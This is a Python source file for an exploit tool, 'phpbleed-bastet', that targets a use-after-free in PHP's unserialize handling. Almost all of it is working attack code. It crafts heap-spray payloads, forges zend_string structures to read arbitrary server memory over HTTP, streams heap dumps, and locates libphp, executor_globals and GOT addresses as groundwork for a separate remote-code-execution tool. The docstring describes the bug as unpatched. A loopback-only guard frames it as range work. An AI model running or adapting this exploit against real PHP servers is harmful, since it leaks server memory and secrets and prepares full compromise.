#!/usr/bin/env python3
"""
phpbleed-bastet.py - Zend heap memory-leak oracle against the
Serializable var_hash UAF (Calif MADBugs family; no CVE; still unpatched
in php 8.2.35/8.3.36/8.4.27/8.5.12 as of 2026-10-21).

BLEEDER ONLY (refactor 2026-10-24, Dean directive: php2shell owns RCE).
Final modes: dump, probe, wpdump, wpprofile. The R-1..R-4 leak phases
STAY (that is the bleed). R-5..R-7 / rce / shell / id / canary MOVED to
php2shell-bastet.py (--route dispatch). This file stays IMPORTABLE as a
leak module for php2shell:

  import importlib.util
  spec = importlib.util.spec_from_file_location(
      "phpbleed_bastet", "/path/to/phpbleed-bastet.py")
  pb = importlib.util.module_from_spec(spec); spec.loader.exec_module(pb)
  # import surface (binding, lanes/refactor/map.md):
  #   pb.Target, pb.heap_leak, pb.read_at, pb.read_via_spray,
  #   pb.scan_for_elf, pb.c_part, pb._spray_with, pb.read_page,
  #   pb.acquire_target_lock, pb.guard_target, pb.log, pb.banner,
  #   pb.SPRAY_LEN / SPRAY_COUNT / REF_BASE / MAX_REFS
  # chain hook pattern: phpbleed_chain.isstring_read =
  #   lambda addr, timeout=5: pb.read_at(t, addr, timeout)
The exec chain lives in php2shell-bastet.py; phpbleed_chain.py remains
the shared read-primitive module (R-2..R-6 readers) both tools import.

Own implementation of the leak primitive + Bastet banner + firing-range
scoring contract. Authorized targets only (127.0.0.1 range services).

Primitive (verified 2026-10-21 in this range):
  C:10:"CachedData":...{O:8:"stdClass":8:{...}}  -> property-write resize
  frees arData while var_hash buckets still point into it (UAF); spray of
  s:280 strings reclaims it; R:refs hand back the mutated buckets; a forged
  zend_string (val ptr + IS_STRING type=6) inside a reclaimed bucket leaks
  target memory in the response body. No crash on misfire (bad ptr -> fault
  is avoided by only forging lens/ptrs already in-map; workers survive).

This file is transport + oracle + orchestration. Chain phases ported from
vendor php8_remote.py (statically audited, no subprocess/eval in vendor
code paths we use): heap_leak, elf scan, gnu_hash, GOT/libc, class table,
spray slot, trigger.
"""

import argparse
import os
import socket
import struct
import sys
import time
from datetime import datetime

VERSION = "1.0.0-bastet"

# --------------------------------------------------------------------------
# Bastet banner (Egyptian cat ascii art; must render in a 80-col terminal)
# --------------------------------------------------------------------------
BANNER = r"""
      /\_/\      PHPBLEED-BASTET v{ver}
     ( o.o )     ------------------------
      =(^^)=     Zend heap leak :: var_hash UAF
                 Bastet watches the heap.
"""


def banner():
    sys.stdout.write(BANNER.format(ver=VERSION))
    sys.stdout.flush()


def log(tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    sys.stdout.write(f"{ts} [{tag}] {msg}\n")
    sys.stdout.flush()


# --------------------------------------------------------------------------
# Target guard: loopback / range only (rules of engagement)
# --------------------------------------------------------------------------
import fcntl
_LOCK = None
def acquire_target_lock(url):
    """One exploit stream per target at a time (heap-thrash rule).
    Key = scheme://host:port (netloc), NOT the full URL, so the lock is
    per-container and holds ACROSS phpbleed and php2shell regardless of
    the path/flags used (refactor 2026-10-24, lanes/refactor/map.md)."""
    global _LOCK
    import hashlib, os
    from urllib.parse import urlparse
    u = urlparse(url if "://" in url else "http://" + url)
    key = hashlib.sha1(f"{u.scheme}://{u.netloc}".encode()).hexdigest()[:12]
    path = os.path.join(os.environ.get("TMPDIR", "/tmp"), f"p2s-{key}.lock")
    _LOCK = open(path, "w")
    try:
        fcntl.flock(_LOCK, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        raise SystemExit(f"[!] another exploit stream holds {path}; one stream per target")


def guard_target(url):
    from urllib.parse import urlparse
    u = urlparse(url if "://" in url else "http://" + url)
    host = u.hostname or ""
    if host in ("127.0.0.1", "localhost", "::1") or host.startswith("127."):
        return u
    raise SystemExit(
        f"[!] guard: {host!r} is not loopback. Rules of engagement: firing-"
        f"range 127.0.0.1 targets only. Refusing.")


# --------------------------------------------------------------------------
# Gadget constants (vendor-compatible; app must expose Serializable gadget)
# --------------------------------------------------------------------------
SPRAY_LEN = 280
SPRAY_COUNT = 32
NUM_PROPS = 8
REF_BASE = 4
MAX_REFS = 8


def _build_inner(num_props=NUM_PROPS):
    props = ""
    for k in range(num_props):
        pname = f"p{k}"
        props += f's:{len(pname)}:"{pname}";i:{0xAAAA0000 + k};'
    return f'O:8:"stdClass":{num_props}:{{{props}}}'


INNER = _build_inner()


_CLASS = "CachedData"


def c_part(class_name=None, inner=None):
    class_name = class_name or _CLASS
    inner = inner if inner is not None else INNER
    return f'C:{len(class_name)}:"{class_name}":{len(inner)}:{{{inner}}}'


# --------------------------------------------------------------------------
# HTTP transport (own impl; supports arbitrary path + cookie or POST field)
# --------------------------------------------------------------------------
class Target:
    def __init__(self, url, field="cook", timeout=4):
        self.u = guard_target(url)
        self.host = self.u.hostname
        self.port = self.u.port or 80
        self.path = self.u.path or "/"
        self.field = field
        self.timeout = timeout
        self.req_count = 0
        self.crash_count = 0

    def urlencode_bytes(self, data):
        out = bytearray()
        for b in data:
            if (0x30 <= b <= 0x39 or 0x41 <= b <= 0x5A or
                    0x61 <= b <= 0x7A or b in (0x2D, 0x2E, 0x5F, 0x7E)):
                out.append(b)
            else:
                out.extend(f"%{b:02X}".encode())
        return bytes(out)

    def send(self, payload, timeout=None):
        """POST serialize payload as form field; return body bytes or None."""
        timeout = timeout or self.timeout
        self.req_count += 1
        body = self.field.encode() + b"=" + self.urlencode_bytes(payload)
        s = None
        for attempt in range(2):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            try:
                s.connect((self.host, self.port))
            except Exception:
                s.close()
                s = None
                if attempt == 0:
                    time.sleep(0.2)
                    continue
                return None
            break
        if s is None:
            return None
        req = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body
        try:
            s.sendall(req)
        except Exception:
            s.close()
            self.crash_count += 1
            return None
        resp = b""
        while True:
            try:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except Exception:
                break
        s.close()
        if b"\r\n\r\n" not in resp:
            self.crash_count += 1
            return None
        return resp.split(b"\r\n\r\n", 1)[1]

    def get(self, path, query=""):
        """Plain GET for verification channels."""
        self.req_count += 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        try:
            s.connect((self.host, self.port))
            s.sendall(f"GET {path}{query} HTTP/1.1\r\nHost: {self.host}\r\n"
                      f"Connection: close\r\n\r\n".encode())
            resp = b""
            while True:
                c = s.recv(65536)
                if not c:
                    break
                resp += c
        except Exception:
            return None
        finally:
            s.close()
        if b"\r\n\r\n" in resp:
            return resp.split(b"\r\n\r\n", 1)[1]
        return None


# --------------------------------------------------------------------------
# Leak oracle: forged zend_string read  (IS_STRING = 6, refcounted flags)
# --------------------------------------------------------------------------
def _spray_with(spray_bytes, total_extra_refs=1, ref_idx=REF_BASE):
    parts = [f'i:0;{c_part()}'.encode("latin-1")]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode("latin-1") +
                     spray_bytes + b'";')
    for k in range(total_extra_refs):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{ref_idx+k};'.encode("latin-1"))
    total = 1 + SPRAY_COUNT + total_extra_refs
    return b'a:' + str(total).encode() + b':{' + b"".join(parts) + b'}'


def _bucket_zvals(spray):
    """Return a list of (offset) of the 8 bucket val slots in the spray."""
    return [8 + k * 32 for k in range(8)]


def read_at(t: Target, addr, timeout=4):
    """Forge zend_string at `addr` (len field assumed at addr-8 within our
    reclaimed bucket slot). Returns (slen, data) or None (crash/no read)."""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
        struct.pack_into("<I", spray, vo + 8, 0x04)
    vo = 8 + 1 * 32
    struct.pack_into("<Q", spray, vo, addr)
    struct.pack_into("<I", spray, vo + 8, 0x06)  # IS_STRING
    payload = _spray_with(bytes(spray), 1, REF_BASE)
    out = t.send(payload, timeout=timeout)
    if out is None:
        return None
    idx = out.find(b"a:")
    if idx < 0:
        return None
    out = out[idx:]
    key = f"i:{SPRAY_COUNT+1};s:".encode()
    pos = out.find(key)
    if pos < 0:
        return None
    pos += len(key)
    try:
        colon = out.index(b":", pos)
        slen = int(out[pos:colon])
    except Exception:
        return None
    dstart = colon + 2
    dend = dstart + slen
    return (slen, out[dstart:dend] if dend <= len(out) else out[dstart:])


def read_page(t: Target, page, max_components=1):
    """Vendor anchoring recipe: forge at page+0x10 (qword @ page = len,
    qword @ page+8 = data ptr). Returns (slen, data) or None.
    max_components>1 is reserved for multi-anchor probing (php2leak parity)."""
    return read_at(t, page + 0x10)


def _read_elf_header(t, addr):
    """Vendor _read_elf_header ported verbatim (empirical anchoring)."""
    r = read_at(t, addr + 0x10, timeout=2)
    if r is None:
        return None
    slen, sdata = r
    if slen != 64 or len(sdata) < 0x12:
        return None
    e_ehsize = struct.unpack_from("<H", sdata, 0x0C)[0]
    e_phentsize = struct.unpack_from("<H", sdata, 0x0E)[0]
    e_phnum = struct.unpack_from("<H", sdata, 0x10)[0]
    if e_ehsize == 64 and e_phentsize == 56 and 3 <= e_phnum <= 20:
        return e_phnum
    return None


def scan_for_elf(t, chunk):
    """Vendor R-2 ported: 2MB-step sweep both directions, then 1MB refinement
    near the highest-phnum candidate. Returns ranked (base, phnum) list."""
    candidates = []
    for i in range(256):
        for d in (1, -1):
            cand = chunk + d * i * 0x200000
            if cand <= 0 or cand > 0x0000FFFFFFFFFFFF:
                continue
            epn = _read_elf_header(t, cand)
            if epn is None:
                continue
            candidates.append((cand, epn))
            log("~", f"ELF @ 0x{cand:x} phnum={epn} ({t.req_count} reqs)")
        big = [epn for _, epn in candidates if epn >= 10]
        if len(big) >= 2 or len(candidates) >= 8:
            break
    if not candidates:
        return []
    known = set(b for b, _ in candidates)
    ref_base = max(candidates, key=lambda x: x[1])[0]
    log("~", f"fine-grained scan near 0x{ref_base:x}")
    for d in (-1, 1):
        consec_miss = 0
        for step in range(1, 129):
            cand = ref_base + d * step * 0x100000
            if cand in known or cand <= 0:
                continue
            epn = _read_elf_header(t, cand)
            if epn is None:
                consec_miss += 1
                if consec_miss >= 32:
                    break
                continue
            candidates.append((cand, epn))
            known.add(cand)
            log("~", f"ELF @ 0x{cand:x} phnum={epn} ({t.req_count} reqs)")
            consec_miss = 0
            if epn >= 10:
                break
    return sorted(candidates, key=lambda x: -x[1])


def heap_leak(t: Target, tries=6):
    """R-1: reclaim var_hash arData with sprayed strings, attach R:refs, and
    recover the pointer ZVAL_MAKE_REF scribbled over a spray bucket."""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
        struct.pack_into("<I", spray, vo + 8, 0x04)
    spray_b = bytes(spray)
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{c_part()}'.encode("latin-1")]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode("latin-1") + spray_b + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{REF_BASE+k};'.encode("latin-1"))
    payload = b"a:" + str(total).encode() + b":{" + b"".join(parts) + b"}"
    for attempt in range(tries):
        out = t.send(payload)
        if out is None:
            continue
        idx = out.find(b"a:")
        if idx < 0:
            continue
        out = out[idx:]
        search = 0
        while True:
            pos = out.find(b's:280:"', search)
            if pos < 0:
                break
            dstart = pos + 7
            if dstart + SPRAY_LEN > len(out):
                break
            sdata = out[dstart:dstart + SPRAY_LEN]
            for k in range(7):
                vo = 8 + (k + 1) * 32
                if vo + 8 > len(sdata):
                    break
                orig = struct.unpack_from("<Q", spray_b, vo)[0]
                curr = struct.unpack_from("<Q", sdata, vo)[0]
                if orig != curr and curr > 0x10000:
                    return curr
            search = dstart + SPRAY_LEN
    return None


# --------------------------------------------------------------------------
# dump mode: stream heap pages around heap_ref; stop on repeated failures
# --------------------------------------------------------------------------
def read_via_spray(t: Target, S, off=0x38, L=0x4000, timeout=6):
    """Self-anchored bleed: our spray string's own bytes become the forged
    zend_string header. Bucket1 val -> S+off; zend_string len sits at
    (S+off)+8 = S+0x40 = spray offset 64, which we wrote = L; data starts
    at (S+off)+0x18 = S+0x50, runs past our 280B string into ADJACENT heap
    allocations and gets echoed back by serialize. This is php2leak streaming."""
    spray = bytearray(SPRAY_LEN)
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into("<I", spray, vo, 0xBBBB0000 + k)
        struct.pack_into("<I", spray, vo + 8, 0x04)
    struct.pack_into("<Q", spray, off + 0x10, L & 0xFFFFFFFFFFFFFFFF)
    # zend_string layout (vendor-proven via their .dynamic anchor trick):
    # len = *(val+0x10), data = val+0x18. We forge val = S+off, write L into
    # our own spray at S+off+0x10, and the echoed data runs from S+off+0x18
    # past the 280-byte string end into adjacent heap allocations.
    vo = 8 + 1 * 32
    struct.pack_into("<Q", spray, vo, S + off)
    struct.pack_into("<I", spray, vo + 8, 0x06)                  # IS_STRING
    out = t.send(_spray_with(bytes(spray), 1, REF_BASE), timeout=timeout)
    if out is None:
        return None
    idx = out.find(b"a:")
    if idx < 0:
        return None
    out = out[idx:]
    key = f"i:{SPRAY_COUNT+1};s:".encode()
    pos = out.find(key)
    if pos < 0:
        return None
    pos += len(key)
    try:
        colon = out.index(b":", pos)
        slen = int(out[pos:colon])
    except Exception:
        return None
    dstart = colon + 2
    dend = dstart + slen
    return (slen, out[dstart:dend] if dend <= len(out) else out[dstart:])


def mode_dump(t: Target, args):
    """Bleed: fresh leak -> locate spray slot S -> self-anchored stream."""
    import phpbleed_chain as chain
    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
    hr = heap_leak(t)
    if not hr:
        log("x", "heap leak failed (gadget missing or shaping mismatch)")
        return 2
    log("+", f"LEAKED heap_ref :: 0x{hr:x}")
    S = chain.find_spray_slot(hr)
    if S is None:
        log("x", "spray slot not located")
        return 2
    log("+", f"spray anchor S :: 0x{S:x}")
    out = open(args.out, "wb") if args.out else sys.stdout.buffer
    total = 0
    L = args.read_len
    for pg in range(args.pages):
        r = read_via_spray(t, S, off=args.off, L=L)
        if r is None:
            log("~", f"stream page {pg}: worker died, re-leaking")
            hr = heap_leak(t)
            if not hr:
                break
            S = chain.find_spray_slot(hr)
            if S is None:
                break
            continue
        slen, data = r
        total += slen
        out.write(data)
        log("~", f"stream :: chunk {pg+1}/{args.pages} :: {slen} bytes")
        if slen >= L:      # read hit the requested length fully; can extend
            L = min(L * 2, 0x100000)
    if hasattr(out, "close"):
        out.close()
    log("+", f"BLED {total} bytes -> {args.out} ({t.req_count} requests)")
    return 0


# --------------------------------------------------------------------------
# probe mode: classify a leaked pointer
# --------------------------------------------------------------------------
def mode_probe(t: Target, args):
    hr = args.addr if args.addr else heap_leak(t)
    if not hr:
        log("x", "no heap leak")
        return 2
    if not args.addr:
        log("+", f"LEAKED heap_ref :: 0x{hr:x}")
    import phpbleed_chain as chain
    chain.isstring_read = lambda addr, timeout=5: read_at(t, addr, timeout)
    chunk = hr & ~0x1FFFFF
    cands = chain.scan_for_elf(chunk)
    libphp = eg = pltgot = None
    for base, phnum in cands:
        log("~", f"validating ELF @ 0x{base:x} phnum={phnum}")
        try:
            eg, pltgot = chain.gnu_hash_resolve(
                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_')
        except RuntimeError as e:
            log("-", f"0x{base:x}: {e}")
            continue
        libphp = base
        break
    if libphp:
        log("+", f"LIBPHP :: base 0x{libphp:x}")
        log("+", f"executor_globals :: 0x{eg:x} (off 0x{eg-libphp:x})")
        log("+", f"PLTGOT :: 0x{pltgot:x}")
    else:
        log("-", "no ELF candidate exports executor_globals")
    return 0 if libphp else 1


# --------------------------------------------------------------------------
# EXEC CHAIN MOVED (2026-10-24): fire_cmd / mode_id / mode_rce / mode_shell /
# mode_canary / _split_for_echo / WEBSHELL_BODY now live in
# php2shell-bastet.py --route dispatch (Dean directive: php2shell owns
# RCE; phpbleed bleeds only). This file keeps the leak oracle above.

# --------------------------------------------------------------------------
def mode_wpdump(t: Target, args):
    """phpbleed's wordpress engine (618/619 route): producer fire + walk
    oracle + assisted stale-chunk dump with pointer following. See
    scripts/wpbleed.py for the engine and channel-honesty notes."""
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                     "scripts"))
    import wpbleed
    rep = wpbleed.wpdump(rounds=args.rounds)
    return 0 if rep["dumps"] else 2


def mode_wpprofile(t: Target, args):
    """The vendor-parity leak block for the WP lane (assisted tier):
    stale_reference, chunk base, zval_ptr_dtor/zend_call_function addrs."""
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                     "..", "scripts"))
    import importlib
    a2 = importlib.import_module("a2_leak_collect")
    rc = a2.main() if hasattr(a2, "main") else 1
    return rc


def main():
    p = argparse.ArgumentParser(description="Bastet Zend-heap BLEED tool "
                                "(var_hash UAF; authorized range only). "
                                "RCE lives in php2shell-bastet.py.")
    p.add_argument("mode", choices=["dump", "probe", "wpdump", "wpprofile"])
    p.add_argument("url", help="http(s)://127.0.0.1:PORT/path (loopback only)")
    p.add_argument("--field", default="cook", help="POST field carrying the "
                   "payload (vendor remote_app.php uses 'cook')")
    p.add_argument("--class", dest="klass", default="CachedData",
                   help="Serializable gadget class name in target app")
    p.add_argument("--stream", action="store_true", help="stream leak to file")
    p.add_argument("--out", default="heap.dump", help="dump output path")
    p.add_argument("--pages", type=int, default=256)
    p.add_argument("--back-pages", type=int, default=64)
    p.add_argument("--off", type=lambda x: int(x, 0), default=0x38,
                   help="dump mode: anchor offset from S (negative reads backward)")
    p.add_argument("--read-len", type=lambda x: int(x, 0), default=0x4000,
                   help="dump mode: bytes per self-anchored read")
    p.add_argument("--addr", type=lambda x: int(x, 16), default=None)
    p.add_argument("--max-components", type=int, default=1,
                   help="leak components per page window (php2leak parity)")
    p.add_argument("--color", default="always", choices=["always", "never"])
    p.add_argument("--rounds", type=int, default=3,
                   help="wpdump mode: producer/dump rounds")
    a = p.parse_args()
    banner()
    global _CLASS
    _CLASS = a.klass
    t = Target(a.url, field=a.field)
    acquire_target_lock(a.url)
    log(">", f"target acquired :: http://{t.host}:{t.port}{t.path}")
    fn = {"dump": mode_dump, "probe": mode_probe,
          "wpdump": mode_wpdump, "wpprofile": mode_wpprofile}[a.mode]
    sys.exit(fn(t, a))


if __name__ == "__main__":
    main()
